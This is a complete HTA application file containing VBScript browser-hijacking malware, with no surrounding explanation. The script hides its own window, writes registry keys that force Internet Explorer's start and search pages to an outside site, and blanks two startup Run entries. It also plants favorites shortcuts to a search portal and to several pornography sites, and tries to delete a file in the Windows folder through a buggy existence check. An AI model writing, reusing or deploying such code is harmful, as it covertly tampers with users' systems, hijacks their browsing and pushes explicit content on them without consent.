<title></title>
<hta:application id=hta_note_id
 applicationName=hta_note_name
 showInTaskBar=no
 caption=no
 innerBorder=no
 selection=no
 scroll=no
 contextmenu=no />
<script language="VBScript.Encode">

self.MoveTo 5000,5000

set WshShell = CreateObject("WScript.Shell") 
set WshProEnv = WshShell.Environment("PROCESS") 
Set fso = CreateObject("Scripting.FileSystemObject")


WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.008i.com/"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Search Bar", "http://www.008i.com/search.html"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.008i.com/search.html"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Use Search Asst", "no"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchUrl", "http://www.008i.com/search.html"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchAssistant", "http://www.008i.com/search.html"
WshShell.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\CustomizeSearch", "http://www.008i.com/search.html"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\SearchAssistant", "http://www.008i.com/search.html"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\Local Page", "http://www.008i.com/"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://www.008i.com/"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page", "http://www.008i.com/search.html"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Bargains", ""
WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sys", ""




sub oShort(url,name,ico)
icon = "SHELL32.dll, "+ico
set oShellLink = WshShell.CreateShortcut(strDesktop & name)
oShellLink.TargetPath = url
oShellLink.IconLocation = icon
oShellLink.Save
end sub

strDesktop = WshShell.SpecialFolders("Favorites")+"/Links"
oShort "http://www.008i.com/search.php?qq=Business", "\Business.lnk", "13"
oShort "http://www.008i.com/search.php?qq=Finance", "\Finance.lnk", "13"
oShort "http://www.008i.com/search.php?qq=Education", "\Education.lnk", "13"
oShort "http://www.008i.com/search.php?qq=Travel", "\Travel.lnk", "13"
oShort "http://www.008i.com/search.php?qq=Home", "\Home.lnk", "13"
oShort "http://www.008i.com", "\Search Portal.lnk", "137"
strDesktop = WshShell.SpecialFolders("Favorites")
oShort "http://www.008i.com", "\Search Portal.lnk", "137"
oShort "http://www.opsex.com", "\Operation Sex - Elite porn galleries.lnk", "86"
oShort "http://www.hotbookmark.com", "\Best porn pictures and movies daily.lnk", "86"
oShort "http://www.yellow500.com", "\Yellow porn pages.lnk", "137"
oShort "http://www.700k.com", "\Clean daily free porn links.lnk", "86"
oShort "http://www.7days.ws", "\Free Porn Links Seven Days a week.lnk", "86"
oShort "http://www.OnlySex.ws", "\Only Sex and nothing else.lnk", "86"
oShort "http://www.xsex.ws", "\eXtreme Sex pictures and movies.lnk", "86"

css = WshProEnv("WINDIR")+"\default.css"
If fso.FileExists("css") = True Then 
     fso.DeleteFile css, True 
  end if

self.close()
</script>

